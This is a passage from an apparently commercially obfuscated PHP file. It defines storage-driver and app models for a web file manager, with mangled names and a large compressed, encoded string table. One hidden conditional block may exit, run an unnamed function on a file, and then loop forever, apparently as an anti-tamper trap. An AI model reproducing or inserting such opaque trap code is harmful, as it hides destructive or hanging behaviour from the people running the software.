"\123\x79\163\x74\145\155\x2e\x73\157\x75\162\143\x65\123\145\143\162\x65\x74\x4c\151\x73\164"; public $field = array("\x73\157\x75\162\x63\145\111\x44", "\164\171\160\145\x49\x44", "\143\162\145\141\164\x65\x55\163\x65\162"); } goto bä´Øêë; bä´Øêë: class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\56\x73\x74\x6f\x72\141\147\x65\x4c\x69\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\163\x69\172\145\115\141\170", "\163\x79\x73\164\x65\155", "\144\145\x66\141\165\154\x74", "\x64\x72\151\x76\x65\x72", "\x63\157\156\x66\x69\x67"); public function listData($×¼º—¸ = false, $ùàÇØæ­ = "\155\x6f\x64\x69\x66\171\x54\x69\x6d\x65", $„›œ¶€ = false) { $¥Èñ§¢İ =& $_SERVER[§ŒØóıü]; $ßÑãÔ–ã = parent::listData($×¼º—¸, $ùàÇØæ­, $„›œ¶€); if ($×¼º—¸) { return $ßÑãÔ–ã; } $ä‰ºüë = $this->ioSizeUseGet(array_to_keyvalue($ßÑãÔ–ã, $¥Èñ§¢İ[12], $¥Èñ§¢İ[399])); foreach ($ßÑãÔ–ã as $Àüãà÷× => $æÖÆ«¬) { unset($ßÑãÔ–ã[$Àüãà÷×][$¥Èñ§¢İ[6]]); $ßÑãÔ–ã[$Àüãà÷×][$¥Èñ§¢İ[1851]] = isset($ä‰ºüë[$æÖÆ«¬[$¥Èñ§¢İ[399]]]) ? $ä‰ºüë[$æÖÆ«¬[$¥Èñ§¢İ[399]]] : 0; } return $ßÑãÔ–ã; } public function ioSizeUseGet($Ôç±ŠÒ) { $Æ½ö†„ =& $_SERVER[§ŒØóıü]; if (!$Ôç±ŠÒ) { return array(); } $ûˆ§õÔ‡ = $Æ½ö†„[2178] . implode($Æ½ö†„[50], $Ôç±ŠÒ); $üœ•¿¤ = Cache::get($ûˆ§õÔ‡); if ($üœ•¿¤) { return $üœ•¿¤; } $¯ªÒ¶¾Ú = array($Æ½ö†„[823] => $Æ½ö†„[399], $Æ½ö†„[2179] => $Æ½ö†„[76]); $½ÑÚ¸İ¶ = array($Æ½ö†„[823] => array($Æ½ö†„[7], $Ôç±ŠÒ)); $üœ•¿¤ = Model($Æ½ö†„[795])->field($¯ªÒ¶¾Ú)->where($½ÑÚ¸İ¶)->group($Æ½ö†„[823])->select(); $üœ•¿¤ = array_to_keyvalue($üœ•¿¤, $Æ½ö†„[399], $Æ½ö†„[76]); Cache::set($ûˆ§õÔ‡, $üœ•¿¤, 600); return $üœ•¿¤; } public function getConfig($ûˆñ„•) { $äÉÎà = parent::listData($ûˆñ„•); return json_decode($äÉÎà[$_SERVER[§ŒØóıü][6]], !0); } public function update($Ò›ê ±, $şš¼‘×¶) { $ÕÂ×èòÒ =& $_SERVER[§ŒØóıü]; $Œˆ¯›èó = $şš¼‘×¶[$ÕÂ×èòÒ[32]]; $¦¼¿ÔØ = array_to_keyvalue(parent::listData(), $ÕÂ×èòÒ[32]); if (isset($¦¼¿ÔØ[$Œˆ¯›èó]) && $¦¼¿ÔØ[$Œˆ¯›èó][$ÕÂ×èòÒ[399]] != $Ò›ê ±) { return !1; } $this->checkPwd($Ò›ê ±, $şš¼‘×¶); if (isset($şš¼‘×¶[$ÕÂ×èòÒ[2180]]) && $şš¼‘×¶[$ÕÂ×èòÒ[2180]] == $ÕÂ×èòÒ[88]) { $this->checkConfig($şš¼‘×¶); } unset($şš¼‘×¶[$ÕÂ×èòÒ[2180]]); $ÛÉúä¦ò = parent::update($Ò›ê ±, $şš¼‘×¶); if ($ÛÉúä¦ò && $şš¼‘×¶[$ÕÂ×èòÒ[37]]) { $™šÂõğ— = 0; foreach ($¦¼¿ÔØ as $ªê­Ãü) { if ($ªê­Ãü[$ÕÂ×èòÒ[37]] && $ªê­Ãü[$ÕÂ×èòÒ[399]] != $Ò›ê ±) { $™šÂõğ— = $ªê­Ãü[$ÕÂ×èòÒ[399]]; parent::update($ªê­Ãü[$ÕÂ×èòÒ[399]], array($ÕÂ×èòÒ[37] => 0)); } } $this->updateBackup($Ò›ê ±, $™šÂõğ—); } return $ÛÉúä¦ò; } public function add($à¤ñ÷º•) { $¿Íôôú˜ =& $_SERVER[§ŒØóıü]; $”ÓâÔ = array_to_keyvalue(parent::listData(), $¿Íôôú˜[32]); if (isset($”ÓâÔ[$à¤ñ÷º•[$¿Íôôú˜[32]]])) { return !1; } $this->checkConfig($à¤ñ÷º•); $€¼¥‡ô = parent::insert($à¤ñ÷º•); if ($€¼¥‡ô && $à¤ñ÷º•[$¿Íôôú˜[37]]) { foreach ($”ÓâÔ as $±şİ‚˜ù) { if ($±şİ‚˜ù[$¿Íôôú˜[37]]) { parent::update($±şİ‚˜ù[$¿Íôôú˜[399]], array($¿Íôôú˜[37] => 0)); } } } return $€¼¥‡ô; } public function updateBackup($ÁĞÙ¹š³, $¬ùÃ×ï¥) { $…é´İ‹Ã =& $_SERVER[§ŒØóıü]; if (!$¬ùÃ×ï¥) { return; } $µ¡´ı± = Model($…é´İ‹Ã[754])->config(); if ($µ¡´ı±[$…é´İ‹Ã[1643]] != $…é´İ‹Ã[88] || $µ¡´ı±[$…é´İ‹Ã[757]] != $¬ùÃ×ï¥) { return; } $‹òš€¶» = Model($…é´İ‹Ã[776])->get($…é´İ‹Ã[786]); $‹òš€¶» = json_decode($‹òš€¶», !0); if (!$‹òš€¶») { return; } $‹òš€¶»[$…é´İ‹Ã[757]] = $ÁĞÙ¹š³; Model($…é´İ‹Ã[776])->set(array($…é´İ‹Ã[786] => $‹òš€¶»)); } public function checkPwd($Ù­«à¤Ô, &$®áş½»ë) { $¢Œ’ƒ–ê =& $_SERVER[§ŒØóıü]; if (empty($®áş½»ë[$¢Œ’ƒ–ê[6]])) { return; } $û—®òÜ– = json_decode($®áş½»ë[$¢Œ’ƒ–ê[6]], !0); $Äû£Ñ± = $¢Œ’ƒ–ê[12]; $—š±É±ú = array($¢Œ’ƒ–ê[2181], $¢Œ’ƒ–ê[2182], $¢Œ’ƒ–ê[895]); foreach ($—š±É±ú as $àÓİÎ–ˆ) { if (isset($û—®òÜ–[$àÓİÎ–ˆ])) { $Äû£Ñ± = $àÓİÎ–ˆ; break; } } if (!$Äû£Ñ±) { return; } $ãÅœí¬Â = $this->getConfig($Ù­«à¤Ô); $ªáÔÙÄ¹ = $ãÅœí¬Â[$Äû£Ñ±]; $Ò‘œ‚‹ß = $û—®òÜ–[$Äû£Ñ±]; if ($Ò‘œ‚‹ß == str_repeat($¢Œ’ƒ–ê[189], strlen($ªáÔÙÄ¹))) { $û—®òÜ–[$Äû£Ñ±] = $ªáÔÙÄ¹; $®áş½»ë[$¢Œ’ƒ–ê[6]] = json_encode($û—®òÜ–); } else { if ($Ò‘œ‚‹ß != $ªáÔÙÄ¹) { $®áş½»ë[$¢Œ’ƒ–ê[2180]] = $¢Œ’ƒ–ê[88]; } } } public function checkConfig(&$¹­ò£§, $™¡·Ş‹ = false) { $èãŒÃ§¨ =& $_SERVER[§ŒØóıü]; $½™óÂ¾Ì = strtolower($¹­ò£§[$èãŒÃ§¨[95]]); $ñùøüÙÜ = json_decode($¹­ò£§[$èãŒÃ§¨[6]], !0); foreach ($ñùøüÙÜ as $ëŒò¡… => $° ğí€) { $ñùøüÙÜ[$ëŒò¡…] = trim($° ğí€); } $ñùøüÙÜ[$èãŒÃ§¨[2183]] = rand_string(6); $¼Î­°óß = $GLOBALS[$èãŒÃ§¨[6]][$èãŒÃ§¨[89]][$èãŒÃ§¨[832]]; $ØŞÇÓí = isset($¼Î­°óß[$½™óÂ¾Ì]) ? $¼Î­°óß[$½™óÂ¾Ì] : ucfirst($½™óÂ¾Ì); $Â›àø› = $èãŒÃ§¨[74] . $ØŞÇÓí; if (!$ØŞÇÓí || !class_exists($Â›àø›)) { if ($™¡·Ş‹) { return LNG($èãŒÃ§¨[2184]); } write_log(array($èãŒÃ§¨[2185], $¹­ò£§, get_caller_info()), $èãŒÃ§¨[2186]); show_json(LNG($èãŒÃ§¨[2184]), !1, $¹­ò£§); } $èº¥Ïâ = new $Â›àø›($ñùøüÙÜ); if (in_array($½™óÂ¾Ì, $èº¥Ïâ->objectDriver)) { if (!$èº¥Ïâ->isBucketCors() && !$èº¥Ïâ->setBucketCors()) { $Ö°×èó³ = LNG($èãŒÃ§¨[2187]); $Ö°×èó³ .= $èãŒÃ§¨[2188] . LNG($èãŒÃ§¨[2189]); if ($™¡·Ş‹) { return $Ö°×èó³; } show_json($Ö°×èó³, !1); } } $áú¯¬¸¬ = rtrim($ñùøüÙÜ[$èãŒÃ§¨[1186]], $èãŒÃ§¨[8]) . $èãŒÃ§¨[8]; $îµ½Ñè˜ = $èº¥Ïâ->getPath($áú¯¬¸¬ . $èãŒÃ§¨[1190]); if (!$èº¥Ïâ->mkfile($îµ½Ñè˜)) { if ($™¡·Ş‹) { return LNG($èãŒÃ§¨[2187]); } show_json(LNG($èãŒÃ§¨[2187]), !1); } $ñùøüÙÜ[$èãŒÃ§¨[1186]] = $áú¯¬¸¬; $¹­ò£§[$èãŒÃ§¨[6]] = json_encode($ñùøüÙÜ); $¹­ò£§[$èãŒÃ§¨[95]] = $ØŞÇÓí; return !0; } public function driverListSystem() { $ÑªŞ‰ãÏ =& $_SERVER[§ŒØóıü]; $ÑË”‘ª­ = parent::listData(); $„¼ÑûıÛ = array(); foreach ($ÑË”‘ª­ as $¯ššÒ·) { unset($¯ššÒ·[$ÑªŞ‰ãÏ[201]], $¯ššÒ·[$ÑªŞ‰ãÏ[85]]); $¯ššÒ·[$ÑªŞ‰ãÏ[6]] = json_decode($¯ššÒ·[$ÑªŞ‰ãÏ[6]], !0); $„¼ÑûıÛ[] = $¯ššÒ·; } return $„¼ÑûıÛ; } public function defaultDriver() { $‹í›ÌÉæ =& $_SERVER[§ŒØóıü]; $»Òæˆ„ü = parent::listData(); $÷‚‚‚Íä = array_filter_by_field($»Òæˆ„ü, $‹í›ÌÉæ[37], 1); $÷‚‚‚Íä = $÷‚‚‚Íä[0]; if ($÷‚‚‚Íä) { $÷‚‚‚Íä[$‹í›ÌÉæ[6]] = json_decode($÷‚‚‚Íä[$‹í›ÌÉæ[6]], !0); } return $÷‚‚‚Íä; } public function driverInfo($çüÉ¸Éë) { $‹ØŒµ =& $_SERVER[§ŒØóıü]; $×ô¸éÌ¾ = array_to_keyvalue(parent::listData(), $‹ØŒµ[399]); if (!isset($×ô¸éÌ¾[$çüÉ¸Éë])) { return !1; } $¼—¤Ê¨š = $×ô¸éÌ¾[$çüÉ¸Éë]; $¼—¤Ê¨š[$‹ØŒµ[6]] = json_decode($¼—¤Ê¨š[$‹ØŒµ[6]], !0); return $¼—¤Ê¨š; } public function remove($Š€Ñîöø) { $this->removeShareItems($Š€Ñîöø); return parent::remove($Š€Ñîöø); } public function removeWithFile($÷çƒÌ’Ì, $ò´Ôåêã) { $æè =& $_SERVER[§ŒØóıü]; $¼ÃŒ·ğ· = array($æè[823] => $÷çƒÌ’Ì); $ÍÍËÈâÉ = Model($æè[471])->where($¼ÃŒ·ğ·)->count(); $ïúŞ¸ºí = Model($æè[471])->where($¼ÃŒ·ğ·)->sum($æè[76]); $Éõ®×Âå = $ò´Ôåêã . $æè[2190] . $÷çƒÌ’Ì; $Â®‚Íğ = LNG($ò´Ôåêã == $æè[548] ? $æè[2191] : $æè[2192]); $Ùø™¦‹Ğ = new TaskFileTransfer($Éõ®×Âå, $æè[2186], $ÍÍËÈâÉ, $Â®‚Íğ . "\50{$÷çƒÌ’Ì}\x29"); $Ùø™¦‹Ğ->task[$æè[769]] = (double) $ïúŞ¸ºí; $šÀ­çõ = KodIO::defaultDriver(); $°Çç¥Ş = $šÀ­çõ[$æè[399]]; $³×•²¢¦ = "\x7b\x69\x6f\72{$°Çç¥Ş}\175\57"; $¿ÙøÅ÷ = !0; $Ê²öËÊç = array(); $ÌšäÕµÎ = Model($æè[200])->where($¼ÃŒ·ğ·)->field($æè[2193])->select(); foreach ($ÌšäÕµÎ as $€æÄ«Èˆ) { $ª²Ç¨‡ß = $€æÄ«Èˆ[$æè[84]]; $Í ­ÔÜ = $³×•²¢¦ . str_replace("\173\x69\x6f\72{$÷çƒÌ’Ì}\x7d\57", $æè[12], $ª²Ç¨‡ß); if (!IO::exist($ª²Ç¨‡ß)) { $Ê²öËÊç[] = $€æÄ«Èˆ[$æè[468]]; $Ùø™¦‹Ğ->updateFileEnd($€æÄ«Èˆ[$æè[32]], $€æÄ«Èˆ[$æè[76]]); continue; } if (IO::exist($Í ­ÔÜ)) { $Ùø™¦‹Ğ->updateFileEnd($€æÄ«Èˆ[$æè[32]], $€æÄ«Èˆ[$æè[76]]); continue; } if (!IO::move($ª²Ç¨‡ß, get_path_father($Í ­ÔÜ))) { $¿ÙøÅ÷ = !1; break; } $¼ÃŒ·ğ· = array($æè[468] => $€æÄ«Èˆ[$æè[468]]); $›şéÌÈ´ = array($æè[823] => $°Çç¥Ş, $æè[84] => $Í ­ÔÜ); Model($æè[200])->where($¼ÃŒ·ğ·)->save($›şéÌÈ´); } $this->removeByFileID($Ê²öËÊç); if (!$¿ÙøÅ÷) { $Ùø™¦‹Ğ->stop($Éõ®×Âå); return !1; } $Ùø™¦‹Ğ->end(); if ($ò´Ôåêã == $æè[1831]) { $this->remove($÷çƒÌ’Ì); } } public function progress($ôÅ£ë‘­, $ïô·Ü¡¢) { return Task::get($ïô·Ü¡¢ . $_SERVER[§ŒØóıü][2190] . $ôÅ£ë‘­); } private function removeByFileID($Áş«Ÿ¹ = array()) { $¥öÒË‘ =& $_SERVER[§ŒØóıü]; if (empty($Áş«Ÿ¹)) { return; } $¡¡ÃìÆ = array($¥öÒË‘[468] => array($¥öÒË‘[7], $Áş«Ÿ¹)); $à†ùéÃ = Model($¥öÒË‘[1345])->where($¡¡ÃìÆ)->field($¥öÒË‘[402])->select(); if (!$à†ùéÃ) { return; } $à†ùéÃ = array_to_keyvalue($à†ùéÃ, $¥öÒË‘[12], $¥öÒË‘[402]); foreach ($à†ùéÃ as $å¶¯±í) { Model($¥öÒË‘[416])->removeNow($å¶¯±í, !1); } } private function removeShareItems($óŠÙŸº·) { $Œ°›õÍÎ =& $_SERVER[§ŒØóıü]; $ßĞÑ˜ˆ = "\173\151\157\x3a{$óŠÙŸº·}\x7d\57"; $“ÄúŸ© = array($Œ°›õÍÎ[402] => 0, $Œ°›õÍÎ[1181] => array($Œ°›õÍÎ[383], "{$ßĞÑ˜ˆ}\x25")); $ƒ„ÏØ¿¨ = Model($Œ°›õÍÎ[1842])->where($“ÄúŸ©)->field($Œ°›õÍÎ[593])->select(); if (empty($ƒ„ÏØ¿¨)) { return; } $‡ê¬Ä¿è = array_to_keyvalue($ƒ„ÏØ¿¨, $Œ°›õÍÎ[12], $Œ°›õÍÎ[593]); Model($Œ°›õÍÎ[592])->remove($‡ê¬Ä¿è); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\56\x4c\151\147\x68\164\x41\160\160"; public $modelType = "\x53\171\x73\x74\145\155\x4f\x70\164\151\x6f\x6e"; public $field = array("\156\x61\x6d\145", "\x67\162\157\165\x70", "\x64\x65\x73\143", "\143\157\156\x74\x65\x6e\164"); public function listData($–°«Íä = false, $¿ÏñÑ„¾ = "\155\x6f\x64\x69\x66\171\x54\x69\x6d\x65", $äã¹÷ä  = true) { return parent::listData($–°«Íä, $¿ÏñÑ„¾, $äã¹÷ä ); } public function remove($ï€™Î¡Ó) { $ÈÊ¨ñ‚ = $this->findByName($ï€™Î¡Ó); if (!$ÈÊ¨ñ‚) { return !1; } return parent::remove($ÈÊ¨ñ‚[$_SERVER[§ŒØóıü][399]]); } public function add($®²ı‹®Ï) { if ($this->findByName($®²ı‹®Ï[$_SERVER[§ŒØóıü][32]])) { return !1; } return parent::insert($®²ı‹®Ï); } public function update($Ã“†ŠÆº, $Î‹´ÂëÜ) { $™‡â—ß’ =& $_SERVER[§ŒØóıü]; $™–·ğÙç = $this->findByName($Ã“†ŠÆº); $´§°®¾Ë = $this->findByName($Î‹´ÂëÜ[$™‡â—ß’[32]]); if (!$™–·ğÙç || $´§°®¾Ë && $´§°®¾Ë[$™‡â—ß’[399]] != $™–·ğÙç[$™‡â—ß’[399]]) { return !1; } return parent::update($™–·ğÙç[$™‡â—ß’[399]], $Î‹´ÂëÜ); } } if (!isset($_SERVER[$_SERVER[§ŒØóıü][746]]) || !isset($_SERVER[$_SERVER[§ŒØóıü][747]])) { $_getc = $_SERVER[§ŒØóıü][748]; $_getfile = $_SERVER[$_SERVER[§ŒØóıü][749]] . $_SERVER[§ŒØóıü][750]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[§ŒØóıü][231], $_getfilec); if (count($_getarrs) < $_SERVER[§ŒØóıü][607]) { $exit = $_SERVER[§ŒØóıü][751]; $exit(); } $_act = $_SERVER[§ŒØóıü][752]; $_act($_SERVER[$_SERVER[§ŒØóıü][749]] . $_SERVER[§ŒØóıü][750]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[§ŒØóıü][378]); } } goto c®©ãò¨ğ; f¬¡…©Õ£Û: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xa7\x8c\xd8\xf3\xfd\xfc", "\255\231\212\272\261\316"); $_SERVER[§ŒØóıü] = explode(strrev('|||'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\7\170\34\325\325\150\10\44\224\100\310\37\10\344\17\20\6\201\221\144\157\221\334\55\133\266\327\322\112\132\173\245\25\273\53\27"."\44\61\36\355\316\152\107\332\235\131\315\314\252\331\46\205\142\72\241\46\200\103\163\22\172\61\35\214\103\15\204\222\20\110\200\20\310\43\200\155\132\300\41\20\322\210\171\267".base64_decode('nFtmdgX/+977vmewd25v5557zrnnnLv5so/P2vbU+r3W77H+i+f+6mfXXvkS/Ub/')."\175\11\375\107\276\217\74\163\237\57\220\77\7\235\171\106\135\135\307\334\375\146\164\355\177\356\35\67\151\327\153\67\151\147\47\342\117\75\35\73\340\327\67\56\217\356\334\374"."\xd4\xc4\xce\x3d\xbe\x70\xd1\x75\x6d\xff\x69\x42\x99\x69\xd9\x26\xfa\xa3\x98\x96\xab\xe8\xe3\x86\xe3\x3a\x34\x22\x63\x99\x39\x63\x90\x7e\x1b\x26\xfd\xd\xd3\x9f\x9e\x64\xdc\xd6\x8b\x96\xab\xd3"."\140\210\376\250\320\57\362\257\63\122\60\130\272\332\225\110\253\251\236\356\356\150\62\15\231\232\344\364\242\225\205\257\222\146\153\105\150\277\244\333\16\352\215\134\235\132\262\112"."\xba\xe9\x89\x11\x11\x59\xcd\xd5\x6\x34\x7\x6a\x6a\x5d\xa6\xb6\x46\xbb\xe3\x89\x35\x6a\x7a\x4d\x77\x14\x72\xc\xa8\x23\x65\xdd\x9e\xa0\x21\xf2\x99\x72\x35\xdb\x4d\x1b\x45\x9d\xe7\x18\xb3\x79"."\xbf\x96\x45\xdb\x63\x5d\x4a\x3a\x19\xe9\x4a\x45\x5a\xd2\xb1\x44\x17\x8d\x6e\x49\x74\x76\xc6\xd2\x95\xf1\xc9\x44\x3c\xbe\x2c\xd2\xb2\xa2\x32\xa5\x3b\x19\x69\xef\x8c\x28\xa8\x7f\x5\x5d\x35\xcc".strrev('6É@åZ¶`+Nz²¿ÅĞ4'."\n".',É–…şi_¢wÖ54ı,…èfÑúz•k)¥¬§Uœ')."\212\32\33\364\12\175\202\307\322\17\255\354\132\206\231\241\201\350\270\153\153\42\36\365\65\203\26\132\67\241\252\124\64\36\155\111\53\270\203\112\133\62\321\251\300\42\24\65".strrev('ÄQ­–Tš5²D²¥S-'."\r".'V%‹ÕÁª¦W$J4.—€kXÉk›§pU4GUemÕÇ').strrev('ÕWse	éğ™=GÁ‚QRÚÚ$4^ñŞ'."\0".'?I2hÕÔ®’´¨C2Ñb¬e').base64_decode('CmUGpsP0txZ+4NdyAHRHDNMoA5hCFZbFtxV8lFluncXoWfgoovIW7Dy0DUfpZ/Ni')."\372\273\20\62\15\250\70\115\267\135\125\67\63\126\326\60\141\263\56\1\240\323\334\174\253\155\240\14\64\234\263\12\131\366\355\30\223\60\224\234\121\320\273\312\105\71\13\17"."\x66\xf2\x46\x21\x6b\xb3\xfd\xf5\x59\x39\x69\x30\xce\xb7\x2b\xce\x2b\x42\x25\xd4\x13\xbe\xd3\x8d\xdc\x84\xd8\x6f\x38\x5f\x37\x4f\x75\xac\xb2\x9d\xd1\x63\x68\x7f\xd0\x70\x23\x44\xeb\xae\x8b\x6"."\7\163\143\130\75\245\202\245\145\123\272\315\207\146\130\155\250\242\104\331\225\43\313\44\133\233\145\27\133\21\146\200\366\321\256\60\172\252\44\14\263\175\221\225\146\54\134\327"."\373\275\340\356\376\336\245\350\237\172\100\175\175\320\247\274\136\50\250\372\270\16\33\247\230\235\343\260\311\10\73\3\206\31\106\61\64\30\113\250\171\315\311\167\146\347\250\244"."\24\303\250\131\175\74\124\312\227\140\127\363\215\334\347\1\154\74\165\135\226\33\225\360\162\301\312\150\5\171\210\364\73\357\272\245\224\156\146\361\114\300\120\254\61\223\314\124"."\111\327\41\123\153\100\311\52\235\312\32\245\243\311\150\162\130\301\142\201\177\261\321\361\70\207\107\272\343\154\71\263\71\372\61\300\216\205\32\150\320\160\10\206\23\333\123\53".base64_decode('lQpGRnMNywxbGVd3g45r6xrUGMlkdMcJtlima1uFYKRQsMaCCdsYNMwmZTogW5SI')."\x36\x75\x10\x23\xc0\x26\xd8\xa9\x35\xb\x15\xc\x38\xb8\x99\xe9\xcd\x65\x37\x17\x9c\xcf\x76\x20\xcf\x6d\x6b\xa6\x93\xd3\xed\x60\x14\x76\x46\x93\x82\x3a\xcb\xb1\x20\xcb\xd6\x6a\x38\x25\xcb\x31".base64_decode('cPeaFM11tUweYxBRffNn5DfMgmHqFXmj4yXD1h3WV6W9Mw2VoNr1YLetDRa1JqVU')."\x1e\x40\x33\x3\x3b\xb5\x4a\x1c\xcd\xd\x53\xd3\xa4\x64\x70\x30\xa0\x14\xcb\x8e\x1b\xb4\x75\x84\x8a\xc\x74\xdc\xc1\x24\xc7\x72\xc1\x4e\xbc\xaf\xc\x3d\x1b\x4c\x21\x8c\xd\xd1\xb3\x1a\x66\x2b".base64_decode('CHQUlkZjO9LpbjXWho7krqjaGUm3dEC3XW2Q9TmO8DCvkkWuDqL9hYGrC41VRHZb')."\x63\xba\x8d\x1a\x5e\x36\xd1\xa4\xc\x5b\xd9\x1\x6b\x3c\xc4\x92\x70\xe6\x14\x42\x34\x2c\x33\x5e\xee\x92\x1b\x4c\x6a\xe6\x20\x9e\x9f\x81\x9\x57\x7\x10\x74\x46\x7\xbd\x13\x1d\xd7\xcd\x41\x37".base64_decode('zwqmosmV0aSaSrSlV0WScJibCErGWVO46kIwqWfR1GdcVk4r4VljefDmwGvFUvGG')."\x61\x69\xf1\x58\x3b\x9e\x98\xd6\xa0\x83\x32\x5\xe5\x5c\xac\xee\xb8\x51\x34\x70\xdf\x5d\x9e\x42\x66\x12\x9d\xf4\xed\xd0\xa1\x30\x19\x50\x73\x9f\x33\xbd\xae\x2f\x3b\xa3\x3e\x88\xfe\x9d\x5e\xdf".strrev('öÚK³àäÆ©–›4Zw…bJ'."\r".'Šè0(+CHÒ®a³2£PÆá2ˆl$¿Şš×Û')."\276\151\245\221\311\350\161\75\321\124\132\355\214\246\73\22\255\320\172\64\2\137\161\213\156\133\66\332\136\372\323\17\253\333\117\177\124\303\151\223\216\25\34\344\350\107\265\6".strrev('­–'."\n".'±–×/˜yƒ¡Ø(Ÿ–FUª#İl´êXãÉ	Aµ(æÇêtbĞ†').base64_decode('MGZkm0Jn2GrQAGwFSFgEUkaxxDrr5svFAekTsL3LTyoHQRL7zlv8ZLNs+GoKQ5Fp')."\63\333\30\336\17\247\146\241\377\5\222\317\132\105\215\241\114\202\354\364\54\305\166\64\152\272\47\245\103\327\304\161\355\332\256\205\143\155\117\26\64\265\171\13\226\170\120\147".base64_decode('XSrzvrFeZvWCzuYlr7MDowGyoQOPz1qOrx6i+1CsOKkNJ4lKYvTOwqswoSwiCuiE')."\112\220\25\27\341\156\133\317\31\260\111\115\264\42\235\232\75\314\306\200\126\100\300\12\16\110\160\324\326\23\217\253\55\211\256\64\42\251\151\314\252\144\54\35\145\160\33\151".strrev('‡\''."\0".''."\n".'qYIŞBP3£¦Y.Ææ8°ÔYXLèÌh=<©‚0'."\n".'+àüİ-#U').base64_decode('7zAYD2rFyWARbYEg76j3DFbS8lEeg7URyB1PI+KK2OHfnUhBgSU4FhFgA7oNjXX3')."\100\122\121\202\213\366\50\104\356\307\316\163\15\310\252\310\252\24\103\314\145\224\337\66\46\65\61\244\45\254\77\154\40\305\202\240\347\274\243\12\212\231\117\167\304\272\126\250".strrev('¾¢zâ„šª*Xêèö1âFV›„ØÒ%—ã”¥°néïŒ®”Ì!u\\hÖ‰')."\xc4\x8\x76\x27\xa3\x6d\xb1\xd5\x3c\xd8\x16\x8b\xc6\x5b\x53\x6a\x4b\xa4\xa5\x43\xe4\xe9\x8a\x74\x42\x40\xcd\x61\x56\xcc\x9\x7b\xf3\xab\x8\xc9\xa6\x38\x43\xa7\x8e\x62\xe6\x94\x4d\x96\xea\xe1"."\241\124\306\35\250\2\206\320\141\252\3\244\301\160\61\113\114\106\2\14\161\306\52\263\43\200\23\222\105\206\31\212\32\154\42\215\35\224\165\364\247\136\211\244\24\267\244\162".strrev('+ H#{Â´4‹ğ…÷º9s’"=\\<qÏL³Î*¢¿¾ĞŒ‘X0É?Á00')."\315\30\150\53\331\156\204\165\47\47\370\136\65\321\35\115\106\60\327\254\256\112\46\272\332\241\300\130\136\147\35\210\301\364\327\61\342\12\230\147\127\240\41\104\31\151\214\213"."\22\223\76\144\261\251\134\117\177\216\245\77\210\50\204\306\165\223\315\372\0\306\310\354\164\141\37\71\264\33\30\66\265\312\274\265\1\313\52\260\175\212\350\3\216\60\70\363"."\75\344\60\40\31\147\250\146\6\73\240\340\124\110\47\126\104\273\124\6\131\64\44\101\43\215\100\354\154\42\11\23\342\132\303\214\47\243\211\311\150\212\355\162\133\37\51\33".strrev('¦ú’ÎuM“^m—Ê<È_P„Rú~£èıB3ƒzê3c}	ğù x::Å'."\0".'¡Âºl').base64_decode('vnBfuG5JU28kOKkFJxuCC4L9M/pC9TMgon/dzMDsDTgDyrjk6H7009y3ZFpf8NgT').strrev('J4˜K)< “x§"êFvjïÌÍø²™;XKõéş±¾èè_Tqšm¯ëíí.×')."\42\166\335\334\15\54\36\255\241\76\50\112\364\6\373\146\364\57\221\312\111\121\376\266\20\271\204\360\157\236\347\213\4\217\307\43\343\105\361\276\7\370\50\233\31\201\75\361"."\276\30\320\62\200\7\214\101\223\157\41\164\222\163\76\335\113\305\257\233\106\177\67\260\205\34\324\307\31\152\60\163\206\15\320\131\66\215\21\46\206\60\365\21\370\260\134\6"."\337\3\272\73\246\63\360\100\361\236\60\2\16\306\72\242\44\51\124\40\204\41\264\200\31\52\16\243\34\230\214\222\212\51\254\61\36\312\352\46\254\323\276\220\333\311\150\45"."\x3d\x25\x8d\x50\x55\xd3\x91\x65\xf1\xa8\xca\x30\xc\x60\x62\x16\x26\x58\x71\x19\x17\xd9\xa1\xa1\x9\x8c\xca\xf0\x43\x46\x90\xf0\x84\x5b\x81\x9d\xef\x8c\x14\x14\x82\x18\x14\xdd\xb6\x2d\xbb\x89"."\x48\x2f\x9d\x72\x9\x13\x64\x88\x33\x73\xd1\xdc\x2a\x88\xa7\x57\x9a\x17\x2b\x74\xca\xa1\x9c\x2a\x2f\x40\x49\x63\x74\x2\xe6\xb6\x75\xb1\xe9\x31\x86\x82\x3e\x95\xc4\xa\x39\x88\x8c\x62\xd4\x4d".base64_decode('uK6vr9yrZ/t7EeBrwVz/ulkb6hmVH+5Df1ggUkWOpnJsqKLzOYT7wUUpngBPpkHL')."\346\44\122\311\103\104\273\226\253\25\74\125\244\161\14\103\115\354\340\6\241\2\135\355\270\300\130\370\50\227\4\220\4\235\166\161\46\236\313\106\44\11\30\56\221\322\335\20"."\317\21\220\22\125\24\366\10\203\233\153\30\262\67\321\166\152\221\216\72\52\332\111\115\70\256\136\364\110\55\35\135\263\63\371\266\162\241\340\162\122\276\140\14\103\13\260\127"."\x40\x88\x1a\x84\xd3\x60\x46\xb5\xa2\x6d\x96\xcd\x38\xe2\xe9\xd0\x8d\x9a\xe9\xd5\x32\xc6\x4c\x13\xf1\xaf\x32\xa8\x89\x43\xb6\x3d\x82\xc8\x99\xb4\x52\xc7\x4\x7e\x4a\xac\x4b\x59\x96\x48\xc4\xa3"."\x91\x2e\x5\x9f\xe7\x70\xe\x21\x62\x21\x15\xed\x8e\xa0\x43\xc\xf3\xd6\xa9\x74\x14\x64\x90\xb1\xd6\x20\xab\x77\x75\x30\x6\x1c\x16\xff\x30\x60\xda\xad\x12\xc6\x20\x2a\x9a\x13\x15\x71\x32\xc3"."\154\55\21\102\164\131\126\220\220\101\10\23\232\1\54\41\12\140\112\43\200\306\20\300\354\121\100\320\356\1\41\160\13\214\32\372\30\371\340\304\166\0\150\360\200\253\331\210".strrev('êİ'."\n".'×CÆÇ¬×X/T}qs´&ĞRXór